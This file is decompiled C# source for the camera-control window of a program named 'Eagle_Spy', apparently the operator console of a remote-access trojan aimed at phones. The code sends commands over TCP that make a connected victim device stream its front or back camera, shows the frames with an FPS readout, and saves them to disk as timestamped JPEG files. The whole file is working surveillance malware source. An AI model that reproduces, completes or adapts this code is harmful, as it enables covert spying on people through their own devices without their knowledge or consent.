using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.My.Resources;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x0200002C RID: 44
	[DesignerGenerated]
	public partial class CameraManager : Form
	{
		// Token: 0x0600035C RID: 860 RVA: 0x0004DCA8 File Offset: 0x0004BEA8
		public CameraManager()
		{
			base.Load += this.CameraManager_Load;
			base.FormClosing += this.CameraManager_FormClosing;
			this.Title = "null";
			this.MouseState = false;
			this.FPS = 0;
			this.FPSTMP = 0;
			this.SizeFrame = "0 kb";
			this.TempImage = null;
			this.KEYsx = "None";
			this.tmpFolderUSER = "";
			this.boSave = false;
			this.Rotateit = false;
			this.SelectedCamera = "";
			this.CamerID = "null";
			this.Changed = false;
			this.frameRate = 25;
			this.newphoto = false;
			this.keepmeto = false;
			this.InitializeComponent();
		}

		// Token: 0x0600035F RID: 863 RVA: 0x00002FA9 File Offset: 0x000011A9
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x06000360 RID: 864 RVA: 0x0004FC74 File Offset: 0x0004DE74
		public void addsizes(object[] objs)
		{
			if (base.InvokeRequired)
			{
				CameraManager.addsizedele addsizedele = new CameraManager.addsizedele(this.addsizes);
				base.Invoke(addsizedele, new object[] { objs });
				return;
			}
			string[] array = (string[])objs[0];
			if (array != null && array.Length != 0)
			{
				string[] array2 = array;
				string[] array3 = array2;
				foreach (string text in array3)
				{
					this.combosizes.Items.Add(text.Replace("[", "").Replace("]", ""));
				}
				this.combosizes.Text = array[0];
				this.combosizes.MaxDropDownItems = array.Length;
			}
		}

		// Token: 0x06000361 RID: 865 RVA: 0x0004FD28 File Offset: 0x0004DF28
		private void tranlsateme()
		{
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) == 0)
				{
					this.startbtn.Text = Codes.Translate(this.startbtn.Text, "en", "zh");
					this.Sbtn.Text = Codes.Translate(this.Sbtn.Text, "en", "zh");
					this.combotext.Text = Codes.Translate(this.combotext.Text, "en", "zh");
					this.qultytext.Text = Codes.Translate(this.qultytext.Text, "en", "zh");
					return;
				}
			}
			else
			{
				this.startbtn.Text = Codes.Translate(this.startbtn.Text, "en", "ar");
				this.Sbtn.Text = Codes.Translate(this.Sbtn.Text, "en", "ar");
				this.combotext.Text = Codes.Translate(this.combotext.Text, "en", "ar");
				this.qultytext.Text = Codes.Translate(this.qultytext.Text, "en", "ar");
			}
		}

		// Token: 0x06000362 RID: 866 RVA: 0x0004FE88 File Offset: 0x0004E088
		private void CameraManager_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
			base.Tag = "Cam_" + this.classClient.UUID;
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\6.ico");
			this.cmbofoucs.Text = "No";
			this.Frames.Start();
			this.ClientPic.Image = this.classClient.Wallpaper;
			this.Text = this.Title;
			this.TOpacity.Interval = SpySettings.T_Interval;
			base.Focus();
			this.TOpacity.Enabled = true;
			IntPtr intPtr = new IntPtr(-2);
			CameraManager.SetWindowPos(base.Handle, intPtr, 0, 0, 0, 0, 3U);
			this.keepmeto = true;
		}

		// Token: 0x06000363 RID: 867 RVA: 0x00002FDF File Offset: 0x000011DF
		private void Frames_Tick(object sender, EventArgs e)
		{
			this.FPS = this.FPSTMP;
			this.FPSTMP = 0;
			this.SizeFrame = "0 kb";
		}

		// Token: 0x06000364 RID: 868 RVA: 0x00002423 File Offset: 0x00000623
		private void CAM0_MouseHover(object sender, EventArgs e)
		{
		}

		// Token: 0x06000365 RID: 869 RVA: 0x00002423 File Offset: 0x00000623
		private void CAM0_MouseLeave(object sender, EventArgs e)
		{
		}

		// Token: 0x06000366 RID: 870 RVA: 0x00002FFF File Offset: 0x000011FF
		public void UpdateFPS()
		{
			base.Invoke(new VB_0024AnonymousDelegate_0(delegate
			{
				this.newphoto = true;
				this.fpstext.Text = string.Concat(new string[]
				{
					" FPS : <",
					Conversions.ToString(this.FPS),
					"> - SPEED : <",
					this.SizeFrame,
					">"
				});
			}));
		}

		// Token: 0x06000367 RID: 871 RVA: 0x0004FF54 File Offset: 0x0004E154
		public Image RotateFlip(Image imag)
		{
			try
			{
				this.TempImage.Image = imag;
				if (this.TempImage != null)
				{
					string keysx = this.KEYsx;
					if (!(keysx == "Right"))
					{
						if (!(keysx == "Left"))
						{
							if (!(keysx == "Up"))
							{
								if (keysx == "Down")
								{
									this.TempImage.Image.RotateFlip(RotateFlipType.RotateNoneFlipX);
									this.TempImage.Tag = "180y";
								}
							}
							else
							{
								this.TempImage.Image.RotateFlip(RotateFlipType.Rotate180FlipX);
								this.TempImage.Tag = "180x";
							}
						}
						else
						{
							this.TempImage.Image.RotateFlip(RotateFlipType.Rotate270FlipNone);
							this.TempImage.Tag = "270n";
						}
					}
					else
					{
						this.TempImage.Image.RotateFlip(RotateFlipType.Rotate90FlipNone);
						this.TempImage.Tag = "90n";
					}
					return this.TempImage.Image;
				}
			}
			catch (Exception)
			{
			}
			return null;
		}

		// Token: 0x06000368 RID: 872 RVA: 0x00002423 File Offset: 0x00000623
		private void Button4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000369 RID: 873 RVA: 0x00002423 File Offset: 0x00000623
		private void Button3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600036A RID: 874 RVA: 0x00050068 File Offset: 0x0004E268
		private void CameraManager_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.boSave = false;
			this.DrakeUILampLED1.Enabled = false;
			this.DrakeUILampLED1.Visible = false;
			this.DrakeUILampLED1.Blink = false;
			this.Frames.Stop();
			this.Frames.Dispose();
			this.DrakeUILampLED1.Dispose();
			this.Frames.Enabled = false;
			if (this.Changed && this.classCamera != null)
			{
				this.classCamera.qit = true;
				this.classCamera.Close(this.classCamera.myClient);
			}
		}

		// Token: 0x0600036B RID: 875 RVA: 0x00050100 File Offset: 0x0004E300
		public void Selected(string V)
		{
			try
			{
				if (this.classClient != null && Operators.CompareString(this.CamerID, "null", false) != 0)
				{
					Client client = this.classClient;
					TcpClient client2 = this.Client;
					string[] array = client.Keys.Split(new char[] { ':' });
					int num = ((Operators.CompareString(this.cmbofoucs.Text, "Yes", false) == 0) ? 1 : 0);
					int num2 = 1;
					string text = "";
					string text2 = "";
					try
					{
						if (this.combosizes.Visible)
						{
							string[] array2 = this.combosizes.Text.Split(new char[] { 'x' });
							text = array2[0];
							text2 = array2[1];
						}
					}
					catch (Exception)
					{
						text = Conversions.ToString(460);
						text2 = Conversions.ToString(840);
					}
					string text3 = this.comboqualty.Text;
					if (client.Isv4)
					{
						object[] array3 = new object[]
						{
							client2,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								V,
								",",
								text,
								",",
								text2,
								",",
								text3,
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.getCamera,
								Data.SPL_SOCKET,
								Conversions.ToString(num),
								Data.SPL_SOCKET,
								Conversions.ToString(num2),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								client.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(array3);
					}
					else
					{
						object[] array4 = new object[]
						{
							client2,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								V,
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.getCamera,
								Data.SPL_SOCKET,
								Conversions.ToString(num),
								Data.SPL_SOCKET,
								Conversions.ToString(num2),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								client.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(array4);
					}
					this.CAM0.Image = Resources.onloading;
					this.statustext.Text = "Please Wait....";
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600036C RID: 876 RVA: 0x00050400 File Offset: 0x0004E600
		private void DrakeUIButton2_Click(object sender, EventArgs e)
		{
			if (this.Changed)
			{
				this.Changed = false;
				if (this.classCamera != null)
				{
					this.statustext.Text = "Select Camera...";
					this.classCamera.qit = true;
					this.classCamera.Close(this.classCamera.myClient);
				}
			}
			this.startbtn.Enabled = true;
			this.CAM0.Image = null;
			this.Sbtn.Enabled = false;
			this.Button3.Enabled = false;
		}

		// Token: 0x0600036D RID: 877 RVA: 0x00002423 File Offset: 0x00000623
		private void DrakeUIButton1_Click_2(object sender, EventArgs e)
		{
		}

		// Token: 0x0600036E RID: 878 RVA: 0x00002423 File Offset: 0x00000623
		private void DrakeUIButton2_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x0600036F RID: 879 RVA: 0x00050488 File Offset: 0x0004E688
		private void Addpo_Click(object sender, EventArgs e)
		{
			if (this.CAM0.Image == null)
			{
				return;
			}
			if (Operators.CompareString(this.Button3.Tag.ToString(), "off", false) == 0)
			{
				this.DrakeUILampLED1.Enabled = true;
				this.DrakeUILampLED1.Visible = true;
				this.DrakeUILampLED1.Blink = true;
				this.Button3.Tag = "on";
				this.savetimer.Start();
				this.Button3.Text = "ON";
				this.Button3.ForeColor = Color.Lime;
				this.boSave = true;
				return;
			}
			if (Operators.CompareString(this.Button3.Tag.ToString(), "on", false) == 0)
			{
				this.DrakeUILampLED1.Enabled = false;
				this.DrakeUILampLED1.Visible = false;
				this.DrakeUILampLED1.Blink = false;
				this.Button3.Tag = "off";
				this.Button3.ForeColor = Color.FromArgb(157, 5, 17);
				this.savetimer.Stop();
				this.Button3.Text = "Save";
				string text = this.tmpFolderUSER + "\\Camera Manager";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				Process.Start(text);
				this.Button3.ForeColor = Color.White;
				this.Button3.BackColor = Color.Transparent;
				this.boSave = false;
			}
		}

		// Token: 0x06000370 RID: 880 RVA: 0x000505FC File Offset: 0x0004E7FC
		private void DrakeUIAvatar2_Click(object sender, EventArgs e)
		{
			if (this.CAM0.Image != null)
			{
				if (Operators.CompareString(this.KEYsx, "Right", false) == 0)
				{
					this.KEYsx = "Down";
					return;
				}
				if (Operators.CompareString(this.KEYsx, "Down", false) == 0)
				{
					this.KEYsx = "Left";
					return;
				}
				if (Operators.CompareString(this.KEYsx, "Left", false) == 0)
				{
					this.KEYsx = "Up";
					return;
				}
				if (Operators.CompareString(this.KEYsx, "Up", false) == 0)
				{
					this.KEYsx = "Right";
					return;
				}
				this.KEYsx = "Right";
			}
		}

		// Token: 0x06000371 RID: 881 RVA: 0x000506A0 File Offset: 0x0004E8A0
		private void Savetimer_Tick(object sender, EventArgs e)
		{
			try
			{
				string text = this.tmpFolderUSER + "\\Camera Manager";
				if (this.boSave)
				{
					if (this.newphoto)
					{
						this.newphoto = false;
						if (!Directory.Exists(text))
						{
							Directory.CreateDirectory(text);
						}
						if (Directory.Exists(text))
						{
							this.CAM0.Image.Save(text + "\\p_" + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg);
						}
					}
				}
				else
				{
					this.savetimer.Stop();
					this.savetimer.Dispose();
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000372 RID: 882 RVA: 0x00050750 File Offset: 0x0004E950
		private void DrakeUIButton1_Click_3(object sender, EventArgs e)
		{
			string text = this.combocam.Text;
			if (Operators.CompareString(text, "Front", false) != 0)
			{
				if (Operators.CompareString(text, "Back", false) == 0)
				{
					this.statustext.Text = "Selected : Back Camera, Please Wait...";
					this.Sbtn.Enabled = true;
					this.startbtn.Enabled = false;
					this.CamerID = "0";
					this.Selected("0");
					this.SelectedCamera = "Back Camera";
					return;
				}
			}
			else
			{
				this.statustext.Text = "Selected : Front Camera, Please Wait...";
				this.Sbtn.Enabled = true;
				this.startbtn.Enabled = false;
				this.CamerID = "1";
				this.Selected("1");
				this.SelectedCamera = "Front Camera";
			}
		}

		// Token: 0x06000373 RID: 883 RVA: 0x0005081C File Offset: 0x0004EA1C
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.hidetoolbtn.TagString, "s", false) == 0)
			{
				this.hidetoolbtn.TagString = "h";
				this.Panel2.Enabled = false;
				this.Panel2.Visible = false;
				return;
			}
			this.hidetoolbtn.TagString = "s";
			this.Panel2.Enabled = true;
			this.Panel2.Visible = true;
		}

		// Token: 0x06000374 RID: 884
		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

		// Token: 0x06000375 RID: 885 RVA: 0x00050894 File Offset: 0x0004EA94
		private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
		{
			IntPtr intPtr;
			if (this.keepmeto)
			{
				this.pinbtn.ForeColor = Color.Lime;
				intPtr = new IntPtr(-1);
				CameraManager.SetWindowPos(base.Handle, intPtr, 0, 0, 0, 0, 3U);
				this.keepmeto = false;
				return;
			}
			this.pinbtn.ForeColor = Color.Red;
			intPtr = new IntPtr(-2);
			CameraManager.SetWindowPos(base.Handle, intPtr, 0, 0, 0, 0, 3U);
			this.keepmeto = true;
		}

		// Token: 0x06000376 RID: 886 RVA: 0x00050750 File Offset: 0x0004E950
		private void drakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			string text = this.combocam.Text;
			if (Operators.CompareString(text, "Front", false) != 0)
			{
				if (Operators.CompareString(text, "Back", false) == 0)
				{
					this.statustext.Text = "Selected : Back Camera, Please Wait...";
					this.Sbtn.Enabled = true;
					this.startbtn.Enabled = false;
					this.CamerID = "0";
					this.Selected("0");
					this.SelectedCamera = "Back Camera";
					return;
				}
			}
			else
			{
				this.statustext.Text = "Selected : Front Camera, Please Wait...";
				this.Sbtn.Enabled = true;
				this.startbtn.Enabled = false;
				this.CamerID = "1";
				this.Selected("1");
				this.SelectedCamera = "Front Camera";
			}
		}

		// Token: 0x06000377 RID: 887 RVA: 0x00003014 File Offset: 0x00001214
		private void UpdateEnglish()
		{
			this.drakeUIButtonIcon2.Text = "Start";
			this.drakeUIButtonIcon1.Text = "Stop";
		}

		// Token: 0x06000378 RID: 888 RVA: 0x00003036 File Offset: 0x00001236
		private void UpdateChinese()
		{
			this.drakeUIButtonIcon2.Text = "开始";
			this.drakeUIButtonIcon1.Text = "停止";
		}

		// Token: 0x06000379 RID: 889 RVA: 0x00003058 File Offset: 0x00001258
		private void UpdateRussian()
		{
			this.drakeUIButtonIcon2.Text = "Старт";
			this.drakeUIButtonIcon1.Text = "Стоп";
		}

		// Token: 0x0600037A RID: 890 RVA: 0x00050910 File Offset: 0x0004EB10
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x0600037B RID: 891 RVA: 0x00050400 File Offset: 0x0004E600
		private void drakeUIButtonIcon1_Click_2(object sender, EventArgs e)
		{
			if (this.Changed)
			{
				this.Changed = false;
				if (this.classCamera != null)
				{
					this.statustext.Text = "Select Camera...";
					this.classCamera.qit = true;
					this.classCamera.Close(this.classCamera.myClient);
				}
			}
			this.startbtn.Enabled = true;
			this.CAM0.Image = null;
			this.Sbtn.Enabled = false;
			this.Button3.Enabled = false;
		}

		// Token: 0x0600037C RID: 892
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x0600037D RID: 893
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x0600037E RID: 894 RVA: 0x0000307A File Offset: 0x0000127A
		private void fpstext_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				CameraManager.ReleaseCapture();
				CameraManager.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x040002D9 RID: 729
		public Client classCamera;

		// Token: 0x040002DA RID: 730
		public TcpClient Client;

		// Token: 0x040002DB RID: 731
		public Client classClient;

		// Token: 0x040002DC RID: 732
		public string Title;

		// Token: 0x040002DD RID: 733
		private bool MouseState;

		// Token: 0x040002DE RID: 734
		public int FPS;

		// Token: 0x040002DF RID: 735
		public int FPSTMP;

		// Token: 0x040002E0 RID: 736
		public string SizeFrame;

		// Token: 0x040002E1 RID: 737
		public PictureBox TempImage;

		// Token: 0x040002E2 RID: 738
		public string KEYsx;

		// Token: 0x040002E3 RID: 739
		public string tmpFolderUSER;

		// Token: 0x040002E4 RID: 740
		public bool boSave;

		// Token: 0x040002E5 RID: 741
		public bool Rotateit;

		// Token: 0x040002E6 RID: 742
		public string SelectedCamera;

		// Token: 0x040002E7 RID: 743
		public string CamerID;

		// Token: 0x040002E8 RID: 744
		public bool Changed;

		// Token: 0x040002E9 RID: 745
		private int frameRate;

		// Token: 0x040002EA RID: 746
		private bool newphoto;

		// Token: 0x040002EB RID: 747
		private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);

		// Token: 0x040002EC RID: 748
		private const uint SWP_NOSIZE = 1U;

		// Token: 0x040002ED RID: 749
		private const uint SWP_NOMOVE = 2U;

		// Token: 0x040002EE RID: 750
		private const uint TOPMOST_FLAGS = 3U;

		// Token: 0x040002EF RID: 751
		private bool keepmeto;

		// Token: 0x0200002D RID: 45
		// (Invoke) Token: 0x06000382 RID: 898
		public delegate void addsizedele(object[] objs);
	}
}
